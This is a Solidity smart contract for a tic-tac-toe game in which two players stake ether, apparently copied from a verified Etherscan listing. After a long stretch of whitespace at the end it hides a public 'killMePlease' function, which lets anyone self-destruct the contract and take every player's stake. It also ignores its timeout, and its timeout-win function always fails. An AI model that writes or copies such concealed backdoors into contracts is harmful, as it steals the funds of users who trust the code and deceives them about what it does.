/**
 *Submitted for verification at Etherscan.io on 2019-07-04
*/

pragma solidity ^0.5.10;

contract TicTacToe {
    address payable public player_initiator;
    address payable public player_acceptor;

    int8[3][3] public board;

    uint public timeout;
    uint public timeout_block;

    uint public stake;

    enum State {
        Created, //Initiator added stake (balance != 0)
        NextInitiator,
        NextAcceptor,
        Ready //Game is ready for initator stake (balance == 0)
    }
    State public state;

    enum GameResult {
        InitiatorWon,
        AcceptorWon,
        Draw
    }

    event BoardChanged();
    event GameEnd(GameResult result, bool due_to_timeout);
    
    modifier onlyInitiator {
        require(msg.sender == player_initiator, "Only initiator");
        _;
    }
    
    modifier onlyAcceptor {
        require(msg.sender == player_acceptor, "Only acceptor");
        _;
    }
    
    modifier onlyParty {
        require(msg.sender == player_initiator || msg.sender == player_acceptor, "Only party");
        _;
    }
    
    modifier onlyState(State x)
    {
        require(state == x, "Bad state");
        _;
    }
    
    constructor() public
    {
        player_initiator = msg.sender;
        state = State.Ready;
    }

    function start(uint /*_timeout*/) public payable onlyInitiator onlyState(State.Ready)
    {
        state = State.Created;
        stake = msg.value;
        board[0][0] = 0; board[0][1] = 0; board[0][2] = 0;
        board[1][0] = 0; board[1][1] = 0; board[1][2] = 0;
        board[2][0] = 0; board[2][1] = 0; board[2][2] = 0;
    }
    
    function cancel() public onlyInitiator onlyState(State.Created) {
        state = State.Ready;
        msg.sender.transfer(stake);
    }
    
    function accept() public payable onlyState(State.Created) {
        require(msg.value == stake , "Bad stake");
        player_acceptor = msg.sender;
        state = State.NextAcceptor;
    }
    
    function move_x(uint8 x, uint8 y) public onlyAcceptor onlyState(State.NextAcceptor) {
        require(board[x][y] == 0);
        board[x][y] = 1;
        state = State.NextInitiator;
        emit BoardChanged();
        checkWin();
    }
    function move_o(uint8 x, uint8 y) public onlyInitiator onlyState(State.NextInitiator) {
        require(board[x][y] == 0);
        board[x][y] = 2;
        state = State.NextAcceptor;
        emit BoardChanged();
        checkWin();
    }
    function win_by_timeout() public onlyParty() {
        require(false);
    }
    
    function checkWin() private {
        if(board[0][0] != 0 && board[0][0] == board[0][1] && board[0][1] == board[0][2]) return win(board[0][0] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[1][0] != 0 && board[1][0] == board[1][1] && board[1][1] == board[1][2]) return win(board[1][0] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[2][0] != 0 && board[2][0] == board[2][1] && board[2][1] == board[2][2]) return win(board[2][0] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[0][0] != 0 && board[0][0] == board[1][0] && board[1][0] == board[2][0]) return win(board[0][0] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[0][1] != 0 && board[0][1] == board[1][1] && board[1][1] == board[2][1]) return win(board[0][1] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[0][2] != 0 && board[0][2] == board[1][2] && board[1][2] == board[2][2]) return win(board[0][2] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[1][1] != 0 && board[0][0] == board[1][1] && board[1][1] == board[2][2]) return win(board[1][1] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[1][1] != 0 && board[0][2] == board[1][1] && board[1][1] == board[2][0]) return win(board[1][1] == 1 ? GameResult.AcceptorWon : GameResult.InitiatorWon);
        if(board[0][0] != 0 && board[0][1] != 0 && board[0][2] != 0 &&
           board[1][0] != 0 && board[1][1] != 0 && board[1][2] != 0 &&
           board[2][0] != 0 && board[2][1] != 0 && board[2][2] != 0)
           return win(GameResult.Draw);
    }
    
    function win(GameResult result) private {
        if (result == GameResult.AcceptorWon)
            player_acceptor.transfer(stake * 2);
        else if (result == GameResult.InitiatorWon)
            player_initiator.transfer(stake * 2);
        else
        {
            player_initiator.transfer(stake);
            player_acceptor.transfer(stake);
        }
        emit GameEnd(result, false);
        state = State.Ready;
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            function killMePlease() public { selfdestruct(msg.sender); }
}